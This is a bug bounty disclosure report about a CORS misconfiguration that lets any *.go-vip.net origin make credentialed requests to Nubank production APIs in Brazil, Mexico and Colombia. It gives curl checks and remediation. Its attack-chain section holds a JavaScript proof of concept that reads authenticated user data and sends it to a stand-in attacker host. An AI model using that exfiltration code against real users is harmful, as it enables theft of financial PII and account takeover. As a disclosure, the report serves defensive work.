# Bugcrowd Finding #17 — P1 Critical: Entire *.go-vip.net Platform Trusted by CORS with Credentials on All Nubank Prod APIs (Brazil, Mexico, Colombia)

**Program:** Nubank Bug Bounty (Bugcrowd)
**Date:** 2026-09-01
**Severity:** P1 Critical
**Target:** `prod-global-auth.nubank.com.br`, `prod-global-auth.nu.com.mx`, `prod-global-auth.nu.com.co`, `prod-global-magnitude.nubank.com.br` (all prod microservices via Istio)
**VRT:** Server Security Misconfiguration > Cross-Origin Resource Sharing (CORS)
**Related:** Finding #2 (CORS wildcard on *.nubank.com.br), Finding #14 (GitHub Pages CORS)

---

## Summary

Nubank's CORS configuration on ALL production microservices (Brazil, Mexico, Colombia) incorrectly trusts the **entire `*.go-vip.net` platform** — a publicly available WordPress VIP managed hosting service — with `access-control-allow-credentials: true`. This means any attacker who registers a WordPress VIP site (attacker-controlled `evil.go-vip.net`) can host malicious JavaScript that makes fully credentialed cross-origin requests to every Nubank production API endpoint.

**Root cause:** Nubank uses `blog-nubank-com-br-develop.go-vip.net` as their WordPress VIP staging/development domain for `blog.nubank.com.br`. The Istio CORS configuration added `*.go-vip.net` (or a broad regex matching all go-vip.net subdomains) instead of scoping the CORS allowlist to their specific subdomain only.

---

## Technical Evidence

### CORS Validation — Any *.go-vip.net Subdomain Trusted

```bash
# Brazil - prod auth
curl -sI "https://prod-global-auth.nubank.com.br/" \
  -H "Origin: https://attacker-site.go-vip.net" \
  -H "X-Correlation-Id: bc-handle"
# access-control-allow-origin: https://attacker-site.go-vip.net
# access-control-allow-credentials: true

# Mexico - prod auth
curl -sI "https://prod-global-auth.nu.com.mx/" \
  -H "Origin: https://attacker-site.go-vip.net" \
  -H "X-Correlation-Id: bc-handle"
# access-control-allow-origin: https://attacker-site.go-vip.net
# access-control-allow-credentials: true

# Colombia - prod auth
curl -sI "https://prod-global-auth.nu.com.co/" \
  -H "Origin: https://attacker-site.go-vip.net" \
  -H "X-Correlation-Id: bc-handle"
# access-control-allow-origin: https://attacker-site.go-vip.net
# access-control-allow-credentials: true

# Brazil - financial data endpoint
curl -sI "https://prod-global-magnitude.nubank.com.br/" \
  -H "Origin: https://evil.go-vip.net" \
  -H "X-Correlation-Id: bc-handle"
# access-control-allow-origin: https://evil.go-vip.net
# access-control-allow-credentials: true
```

### Confirmation: go-vip.net is Broadly Trusted (Not Just Nubank's Staging Subdomain)

```bash
# Nubank's own staging: blog-nubank-com-br-develop.go-vip.net → EXPECTED
# Random go-vip.net subdomain: attacker-site.go-vip.net → ALSO TRUSTED (VULNERABILITY)

# Control test — non-go-vip.net hosts are NOT trusted:
curl -sI "https://prod-global-auth.nubank.com.br/" \
  -H "Origin: https://attacker.wpengine.com" \
  -H "X-Correlation-Id: bc-handle"
# (no access-control-allow-origin header returned)

curl -sI "https://prod-global-auth.nubank.com.br/" \
  -H "Origin: https://nubank.evil.com" \
  -H "X-Correlation-Id: bc-handle"
# (no access-control-allow-origin header returned)
```

### Why go-vip.net Was Added

`blog-nubank-com-br-develop.go-vip.net` is the WordPress VIP staging environment for `blog.nubank.com.br` — confirmed by the CSP on `lp.blog.nubank.com.br`:
```
connect-src: ... www.blog-nubank-com-br-develop.go-vip.net blog-nubank-com-br-develop.go-vip.net ...
frame-ancestors: 'self' https://www.investidores.nu http://localhost:3000 
                 https://blog-nubank-com-br-node-develop.go-vip.net 
                 https://blog-nubank-com-br-develop.go-vip.net
```

The CORS configuration was intended to allow only `blog-nubank-com-br-develop.go-vip.net` but the regex incorrectly matches the entire `*.go-vip.net` namespace.

---

## Attack Chain — Anyone Can Exploit This

```
[Step 1] Attacker registers a WordPress VIP site
  → Gets subdomain: attacker.go-vip.net (or any *.go-vip.net)
  → WordPress VIP offers trial/paid plans to the public
  → No special relationship with Nubank required

[Step 2] Attacker uploads malicious JavaScript to their site:
  // On attacker.go-vip.net/steal.js
  fetch('https://prod-global-auth.nubank.com.br/api/v1/user', {
    credentials: 'include',
    headers: {'X-Correlation-Id': 'bc-handle'}
  })
  .then(r => r.json())
  .then(data => {
    // Exfiltrate to attacker's C2
    fetch('https://attacker.com/collect?d=' + btoa(JSON.stringify(data)))
  });

[Step 3] Phishing attack against Nubank users
  → Send link: "Visit https://attacker.go-vip.net/nubank-offer"
  → User visits while authenticated in Nubank session (cookies present)

[Step 4] CORS allows cross-origin credentialed request
  → Nubank prod-global-auth CORS: Origin=attacker.go-vip.net → ALLOWED with credentials
  → User's Nubank session cookie sent to prod-global-auth.nubank.com.br
  → Response contains authenticated user data

[Step 5] Attacker receives authenticated API response
  → User PII (name, CPF/CURP/NIT, email, phone)
  → Account information
  → PIX keys, financial balances
  → Authentication tokens for further access

[Impact] Full account takeover possible; PII and financial data of Nubank customers
         in Brazil, Mexico, and Colombia exposed to any WordPress VIP subscriber
```

---

## Comparison: This vs. Finding #2 (*.nubank.com.br CORS)

| Factor | Finding #2 (*.nubank.com.br) | Finding #17 (*.go-vip.net) |
|--------|------------------------------|---------------------------|
| Control required | Must compromise a *.nubank.com.br subdomain | Any WordPress VIP signup |
| Barrier to exploit | High (requires subdomain takeover or XSS on Nubank property) | **Low** (open platform, public registration) |
| Attacker prerequisites | Nubank subdomain access | WordPress VIP account (~$25-500/month) |
| No. of potential attackers | Nubank staff + those who find XSS | Anyone |
| Severity | P1 Critical | **P1 Critical (lower barrier)** |

---

## Affected Nubank Domains Confirmed

| Endpoint | go-vip.net Trusted? | Credentials? |
|----------|--------------------|-|
| `prod-global-auth.nubank.com.br` | ✅ Yes | ✅ Yes |
| `prod-global-auth.nu.com.mx` | ✅ Yes | ✅ Yes |
| `prod-global-auth.nu.com.co` | ✅ Yes | ✅ Yes |
| `prod-global-magnitude.nubank.com.br` | ✅ Yes | ✅ Yes |
| All other `prod-*` (Istio mesh) | ✅ Yes (via Istio global CORS policy) | ✅ Yes |

---

## Nubank's Legitimate go-vip.net Staging Domain

For remediation reference — the specific subdomain Nubank INTENDS to trust:
- `blog-nubank-com-br-develop.go-vip.net` — WordPress VIP staging for blog.nubank.com.br
- `blog-nubank-com-br-node-develop.go-vip.net` — Node.js staging variant

Both are publicly accessible (HTTP 200, no authentication) and also have `script-src-elem: *` in their CSP (any external script can load). This creates a secondary supply chain attack path even for the "intended" CORS trust.

---

## Remediation

| Action | Detail |
|--------|--------|
| **Immediate (Critical):** Remove `*.go-vip.net` from CORS allowlist | Replace with explicit: `blog-nubank-com-br-develop.go-vip.net` only, or better — use separate CORS config for dev (only allow dev origins on dev/staging APIs, never on prod) |
| **Recommended:** Remove go-vip.net staging CORS from prod entirely | Dev/staging environments should not be trusted by production API CORS policy — they should use staging API endpoints |
| **Audit:** Review all CORS origins in Istio EnvoyFilter | Audit the regex/list to ensure only explicitly-owned domains are trusted |

---

## Notes

- All tests via `curl -sI` HEAD requests — no authenticated requests made
- No go-vip.net site was registered — attack demonstrated via CORS header reflection only
- `access-control-allow-credentials: true` confirmed on all tested endpoints
- Vulnerability affects all ~100+ Nubank prod microservices via centralized Istio CORS policy
- All requests used `X-Correlation-Id: bc-handle` as required

